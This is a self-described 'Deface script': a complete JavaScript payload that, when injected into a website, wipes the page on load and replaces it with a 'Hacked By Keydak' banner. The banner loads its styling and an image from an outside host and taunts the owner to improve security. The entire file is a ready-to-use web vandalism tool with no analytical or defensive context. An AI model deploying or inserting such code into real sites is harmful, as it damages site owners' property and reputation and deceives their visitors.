// Deface script
document.addEventListener('DOMContentLoaded', function () {

    document.documentElement.innerHTML = '';


    var newHtmlContent = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Home - Hacked By Keydak</title>
            <link rel="stylesheet" href="https://kepo-six.vercel.app/style.css">
        </head>
        <style>
      .typewrite {
    display: inline-block;
    overflow: hidden;
    white-space: nowrap;
    font-family: monospace;
    border-right: 2px solid;
    animation: typing 4s steps(40, end), blink-caret .75s step-end infinite; 
    width: 100%;
}

/* Efek pengetikan */
@keyframes typing {
    from { width: 0; }
    to { width: 100%; }
}

/* Efek kursor berkedip */
@keyframes blink-caret {
    from, to { border-color: transparent; }
    50% { border-color: white; }
}


</style>
        <body>
            <div class="mainContainer">
                <div class="img">
                    <img class="mainImage" src="https://kepo-six.vercel.app/jett.png" alt="image" style="width: 400px;">
                </div>
                <h1> Hacked By Keydak</h1>
                <hr class="hr">
                <div class="container">
                <p class="typewrite">You need to improve the security system on your site</p>
                </div>
            </div>
        </body>
        </html>
        
    `;


    document.documentElement.innerHTML = newHtmlContent;
});